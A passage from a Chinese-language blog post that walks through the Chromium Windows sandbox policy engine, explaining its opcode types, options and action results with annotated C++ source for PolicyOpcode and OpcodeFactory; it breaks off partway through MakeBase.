order-----------&gt;</span><br></pre></td></tr></table></figure><p>每个操作码组编码一个高级策略规则。仅当组上的所有条件计算为true时，该规则才适用。操作操作码包含该特定规则的策略结果。</p><p>关于 opcode：</p><ul><li>每个 opcode 都有其对应的Options，这些Options在创建 opcode 的时候就已经被指定。</li><li>每个 opcode 由：opcodeID、 一个index索引表示哪个是输入参数、一个参数数组三部分组成。</li><li>opcode 由 borker 进程中生成的，并作为原始内存复制到目标进程</li><li>一个opcode组由N个comparison opcodes加上一个action opcode组成</li></ul><h3 id="OpcodeID"><a href="#OpcodeID" class="headerlink" title="OpcodeID"></a>OpcodeID</h3><p>以下是已实现的操作码。</p><ul><li><p><strong>OP_ALWAYS_FALSE：</strong> Evaluates to false (EVAL_FALSE).</p></li><li><p><strong>OP_ALWAYS_TRUE：</strong> Evaluates to true (EVAL_TRUE).</p></li><li><p><strong>OP_NUMBER_MATCH：</strong>Match a 32-bit integer as n == a.</p></li><li><p><strong>OP_NUMBER_MATCH_RANGE：</strong>Match a 32-bit integer as a &lt;= n &lt;= b.</p></li><li><p><strong>OP_NUMBER_AND_MATCH：</strong>Match using bitwise AND; as in: n &amp; a != 0.</p></li><li><p><strong>OP_WSTRING_MATCH：</strong>Match a string for equality.</p></li><li><p><strong>OP_ACTION：</strong>Evaluates to an action opcode.</p></li></ul><h3 id="Opcode-Options"><a href="#Opcode-Options" class="headerlink" title="Opcode Options"></a>Opcode Options</h3><p>适用于每个操作码的选项。它们在使用OpcodeFactory::MakeOpXXXXX()函数族创建每个操作码时指定。</p><ul><li><strong>const uint32_t kPolNone = 0 ：</strong>无特殊含义。</li><li><strong>const uint32_t kPolNegateEval = 1：</strong>将<code>EVAL_TRUE</code>转换为<code>EVAL_FALSE</code>，反之亦然。这允许表示否定条件，例如<code>if(a&amp;&amp;!b)</code></li><li><strong>const uint32_t kPolClearContext = 2：</strong>将<code>MatchContext</code>结构归零。这发生在操作码被<code>evaluated</code>之后。</li><li><strong>const uint32_t kPolUseOREval = 4：</strong>在评估这组操作码时使用 OR。默认情况下，策略评估器在评估时使用 AND。与 kPolNegateEval 一起使用时非常有用。例如使用这个标志可以把 if(! (a &amp;&amp; b &amp;&amp; c)) 表示为if ((!a) || (!b) || (!c))</li></ul><h3 id="Comparison-opcode"><a href="#Comparison-opcode" class="headerlink" title="Comparison opcode"></a>Comparison opcode</h3><ul><li><p><strong>EVAL_TRUE：</strong>  Opcode condition evaluated true.</p></li><li><p><strong>EVAL_FALSE：</strong> Opcode condition evaluated false.</p></li><li><p><strong>EVAL_ERROR：</strong>Opcode condition generated an error while evaluating.</p></li></ul><h3 id="Action-opcode"><a href="#Action-opcode" class="headerlink" title="Action opcode"></a>Action opcode</h3><ul><li><strong>ASK_BROKER：</strong>target 必须向 broker 生成一个IPC。在浏览器端，这意味着授予访问权限。</li><li><strong>DENY_ACCESS：</strong>没有授予对资源的访问权限。</li><li><strong>GIVE_READONLY：</strong>授予对资源的只读访问权限</li><li><strong>GIVE_ALLACCESS：</strong>授予对资源的完全访问权限。</li><li><strong>GIVE_CACHED：</strong>不需要 IPC。 target可以返回缓存的句柄。</li><li><strong>GIVE_FIRST：</strong>TODO(cpu)</li><li><strong>SIGNAL_ALARM：</strong> 不寻常的活动。 产生警报。</li><li><strong>FAKE_SUCCESS：</strong>不调用原始函数。 只需返回’成功’。</li><li><strong>FAKE_ACCESS_DENIED：</strong>不调用原始函数。 只需返回“拒绝”，不进行 IPC通信。</li><li><strong>TERMINATE_PROCESS：</strong>销毁target进程。 IPC通信。</li></ul><h2 id="Policyopcde"><a href="#Policyopcde" class="headerlink" title="Policyopcde"></a>Policyopcde</h2><p>policy opcode是基于此运营的，除了第一个参数都存储在此对象中进行裁决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PolicyOpcode</span> &#123;</span></span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">OpcodeFactory</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 评估函数，根据opcode是comparison还是action，返回两类结果</span></span><br><span class="line">  <span class="comment">// parameters: 一个存储输入参数的数组</span></span><br><span class="line">  <span class="comment">// count: 第一个参数传递的参数的数量。</span></span><br><span class="line">  <span class="comment">// match: 在操作码求值序列中保留的匹配上下文。</span></span><br><span class="line">  <span class="function">EvalResult <span class="title">Evaluate</span><span class="params">(<span class="keyword">const</span> ParameterSet* parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                      MatchContext* match)</span></span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Valid index values are from 0 to &lt; kArgumentCount.</span></span><br><span class="line">  <span class="comment">// 根据 index，返回参数</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetArgument</span><span class="params">(<span class="keyword">size_t</span> index, T* argument)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(T) &lt;= <span class="keyword">sizeof</span>(arguments_[<span class="number">0</span>]), <span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">    *argument = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> T*&gt;(&amp;arguments_[index].mem);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sets a stored argument by index. </span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetArgument</span><span class="params">(<span class="keyword">size_t</span> index, <span class="keyword">const</span> T&amp; argument)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(T) &lt;= <span class="keyword">sizeof</span>(arguments_[<span class="number">0</span>]), <span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">    *<span class="keyword">reinterpret_cast</span>&lt;T*&gt;(&amp;arguments_[index].mem) = argument;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检索字符串参数的实际地址 </span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">wchar_t</span>* <span class="title">GetRelativeString</span><span class="params">(<span class="keyword">size_t</span> index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ptrdiff_t</span> str_delta = <span class="number">0</span>;</span><br><span class="line">    GetArgument(index, &amp;str_delta);</span><br><span class="line">    <span class="comment">// 字符串的GetArgument返回的是一个offset</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* delta = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(<span class="keyword">this</span>) + str_delta;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">wchar_t</span>*&gt;(delta);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true if this opcode is an action opcode without actually</span></span><br><span class="line">  <span class="comment">// evaluating it. Used to do a quick scan forward to the next opcode group.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">IsAction</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> (OP_ACTION == opcode_id_); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the opcode type.</span></span><br><span class="line">  <span class="function">OpcodeID <span class="title">GetID</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> opcode_id_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the stored options such as kPolNegateEval and others.</span></span><br><span class="line">  <span class="function"><span class="keyword">uint32_t</span> <span class="title">GetOptions</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> options_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sets the stored options such as kPolNegateEval.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetOptions</span><span class="params">(<span class="keyword">uint32_t</span> options)</span> </span>&#123; options_ = options; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the parameter of the function the opcode concerns.</span></span><br><span class="line">  <span class="function"><span class="keyword">uint16_t</span> <span class="title">GetParameter</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> kArgumentCount = <span class="number">4</span>;  <span class="comment">// The number of supported argument.</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">OpcodeArgument</span> &#123;</span></span><br><span class="line">    UINT_PTR mem;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// Better define placement new in the class instead of relying on the</span></span><br><span class="line">  <span class="comment">// global definition which seems to be fubared.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span>, <span class="keyword">void</span>* location)</span> </span>&#123; <span class="keyword">return</span> location; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 真正去评估的函数</span></span><br><span class="line">  <span class="function">EvalResult <span class="title">EvaluateHelper</span><span class="params">(<span class="keyword">const</span> ParameterSet* parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">                            MatchContext* match)</span></span>;</span><br><span class="line">  OpcodeID opcode_id_;</span><br><span class="line">  <span class="keyword">int16_t</span> parameter_;</span><br><span class="line">  <span class="keyword">uint32_t</span> options_;</span><br><span class="line">  OpcodeArgument arguments_[PolicyOpcode::kArgumentCount];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="PolicyOpcode-Evaluate"><a href="#PolicyOpcode-Evaluate" class="headerlink" title="PolicyOpcode::Evaluate()"></a>PolicyOpcode::Evaluate()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.cc</span></span><br><span class="line"><span class="comment">//此函数是评估任何操作码的唯一入口。</span></span><br><span class="line"><span class="function">EvalResult <span class="title">PolicyOpcode::Evaluate</span><span class="params">(<span class="keyword">const</span> ParameterSet* call_params,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">size_t</span> param_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  MatchContext* match)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!call_params)</span><br><span class="line">    <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">  <span class="keyword">const</span> ParameterSet* selected_param = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (parameter_ &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(parameter_) &gt;= param_count) &#123;</span><br><span class="line">      <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    selected_param = &amp;call_params[parameter_];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">//selected_param借助parameter_的值找到本次想要处理的ParameterSet</span></span><br><span class="line">  EvalResult result = EvaluateHelper(selected_param, match);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不管操作码的具体类型是什么，都应用通用选项。</span></span><br><span class="line">  <span class="keyword">if</span> (kPolNone == options_) &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果本PolicyOpcode的标记了kPolNegateEval位，那么就要对结果取反（ERROR不管）</span></span><br><span class="line">  <span class="keyword">if</span> (options_ &amp; kPolNegateEval) &#123;</span><br><span class="line">    <span class="keyword">if</span> (EVAL_TRUE == result) &#123;</span><br><span class="line">      result = EVAL_FALSE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EVAL_FALSE == result) &#123;</span><br><span class="line">      result = EVAL_TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EVAL_ERROR != result) &#123;</span><br><span class="line">      result = EVAL_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (match) &#123;</span><br><span class="line">      <span class="comment">// 如果标记了kPolClearContext位，那么要对辅助结构MatchContext进行清理工作</span></span><br><span class="line">    <span class="keyword">if</span> (options_ &amp; kPolClearContext)</span><br><span class="line">      match-&gt;Clear();</span><br><span class="line">      <span class="comment">// 如果标记了kPolUseOREval，那么就对辅助结构MatchContext打上标记</span></span><br><span class="line">    <span class="keyword">if</span> (options_ &amp; kPolUseOREval)</span><br><span class="line">      match-&gt;options = kPolUseOREval;<span class="comment">//默认是用AND来裁决，该标记表示用OR</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPCODE_EVAL(op, x, y, z) \</span></span><br><span class="line">  <span class="keyword">case</span> op:                       \</span><br><span class="line">    <span class="keyword">return</span> OpcodeEval&lt;op&gt;(x, y, z)</span><br><span class="line"></span><br><span class="line">EvalResult PolicyOpcode::EvaluateHelper(<span class="keyword">const</span> ParameterSet* parameters,</span><br><span class="line">                                        MatchContext* match) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (opcode_id_) &#123;</span><br><span class="line">    OPCODE_EVAL(OP_ALWAYS_FALSE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_ALWAYS_TRUE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_MATCH_RANGE, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_NUMBER_AND_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_WSTRING_MATCH, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    OPCODE_EVAL(OP_ACTION, <span class="keyword">this</span>, parameters, match);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>EvaluateHelper</code> 根据<code>opcode_id_</code>来分类调用<code>OPCODE_EVAL</code>来评估</p><h3 id="OPCODE-EVAL"><a href="#OPCODE-EVAL" class="headerlink" title="OPCODE_EVAL()"></a>OPCODE_EVAL()</h3><p>每个<code>opcodeid</code> 都有其对应的<code>OpcodeEval</code>实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.cc</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ALWAYS_FALSE&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                       <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                       MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">return</span> EVAL_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ALWAYS_TRUE&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                      <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                      MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">return</span> EVAL_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_ACTION&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                 <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                 MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">int</span> action = <span class="number">0</span>;</span><br><span class="line">  opcode-&gt;GetArgument(<span class="number">0</span>, &amp;action);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;EvalResult&gt;(action);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line">EvalResult OpcodeEval&lt;OP_NUMBER_AND_MATCH&gt;(PolicyOpcode* opcode,</span><br><span class="line">                                           <span class="keyword">const</span> ParameterSet* param,</span><br><span class="line">                                           MatchContext* context) &#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!param-&gt;Get(&amp;value))</span><br><span class="line">    <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> number = <span class="number">0</span>;</span><br><span class="line">  opcode-&gt;GetArgument(<span class="number">0</span>, &amp;number);</span><br><span class="line">  <span class="keyword">return</span> (number &amp; value) ? EVAL_TRUE : EVAL_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果是 match 类的 ID，其最终就是 opcode内存储的<code>Argument</code>和<code>param</code>的比较，返回 TRUE or FALSE</p><p>如果是 OP_ACTION，则返回其对应的<code>EvalResult</code>，如：askbroker.</p><h2 id="OpcodeFactory"><a href="#OpcodeFactory" class="headerlink" title="OpcodeFactory"></a>OpcodeFactory</h2><p>opcode 的一个工程类，用来make opcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.h</span></span><br><span class="line"><span class="comment">// Factory通过使用构造函数中给定的内存块创建操作码来工作。 </span></span><br><span class="line"><span class="comment">//操作码本身是从内存的开头（顶部）分配的，而操作码需要的任何字符串都是从内存的结尾（底部）分配的。</span></span><br><span class="line"><span class="comment">// In essence:</span></span><br><span class="line"><span class="comment">//   low address ---&gt; [opcode 1]</span></span><br><span class="line"><span class="comment">//                    [opcode 2]</span></span><br><span class="line"><span class="comment">//                    [opcode 3]</span></span><br><span class="line"><span class="comment">//                    |        | &lt;--- memory_top_</span></span><br><span class="line"><span class="comment">//                    | free   |</span></span><br><span class="line"><span class="comment">//                    |        |</span></span><br><span class="line"><span class="comment">//                    |        | &lt;--- memory_bottom_</span></span><br><span class="line"><span class="comment">//                    [string 1]</span></span><br><span class="line"><span class="comment">//   high address --&gt; [string 2]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpcodeFactory</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// memory: 指向创建操作码的内存块的基指针。</span></span><br><span class="line">    <span class="comment">// memory_size: chunk size</span></span><br><span class="line">  OpcodeFactory(<span class="keyword">char</span>* memory, <span class="keyword">size_t</span> memory_size) : memory_top_(memory) &#123;</span><br><span class="line">    memory_bottom_ = &amp;memory_top_[memory_size];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">// policy:包含创建操作码的原始内存</span></span><br><span class="line">  OpcodeFactory(PolicyBuffer* policy, <span class="keyword">size_t</span> memory_size) &#123;</span><br><span class="line">    memory_top_ = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(&amp;policy-&gt;opcodes[<span class="number">0</span>]);</span><br><span class="line">    memory_bottom_ = &amp;memory_top_[memory_size];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">memory_size</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    DCHECK_GE(memory_bottom_, memory_top_);</span><br><span class="line">    <span class="keyword">return</span> memory_bottom_ - memory_top_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Creates an OpAlwaysFalse opcode.</span></span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAlwaysFalse</span><span class="params">(<span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAlwaysTrue</span><span class="params">(<span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpAction</span><span class="params">(EvalResult action, <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint32_t</span> match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpVoidPtrMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">void</span>* match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberMatchRange</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> lower_bound,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> upper_bound,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpWStringMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">wchar_t</span>* match_str,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">int</span> start_position,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   StringMatchOptions match_opts,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeOpNumberAndMatch</span><span class="params">(<span class="keyword">int16_t</span> selected_param,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint32_t</span> match,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">uint32_t</span> options)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function">PolicyOpcode* <span class="title">MakeBase</span><span class="params">(OpcodeID opcode_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">uint32_t</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">int16_t</span> selected_param)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">ptrdiff_t</span> <span class="title">AllocRelative</span><span class="params">(<span class="keyword">void</span>* start, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* str, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line">  <span class="keyword">char</span>* memory_top_;</span><br><span class="line">  <span class="keyword">char</span>* memory_bottom_;</span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(OpcodeFactory);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中比较重要的是<code>MakeBase()</code>，所有的 make，最后都会调用这个函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PolicyOpcode* <span class="title">OpcodeFactory::MakeBase</span><span class="params">(OpcodeID opcode_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">uint32_t</span> 